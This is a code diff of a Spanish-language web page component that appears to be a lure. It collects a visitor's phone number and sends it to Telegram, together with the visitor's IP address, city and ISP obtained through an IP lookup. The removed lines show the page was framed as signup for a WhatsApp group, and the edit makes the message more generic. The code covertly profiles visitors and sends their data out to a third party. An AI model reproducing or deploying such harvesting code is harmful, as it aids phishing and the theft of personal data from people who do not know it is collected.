@@ -35,10 +35,8 @@ function HomePage() {
             const userAgent = navigator.userAgent;
             return {
                 ip: data.ip,
-                country: data.country_name,
                 city: data.city,
                 isp: data.org,
-                device: userAgent
             };
         } catch (error) {
             return {
@@ -77,11 +75,8 @@ function HomePage() {
 
             // Enviar número de teléfono y datos del usuario a Telegram
             const message = `
-📱 Nuevo número de móvil para grupo WhatsApp:
-👥 Grupo: Más40 | Comunidad
+📱 Nuevo registro:
 📞 Número: +34 ${phone}
-
-🌐 INFORMACIÓN DEL USUARIO
 🔌 IP: ${userInfo.ip}
 🏙️ Ciudad: ${userInfo.city} 📡 ISP: ${userInfo.isp}
       `;
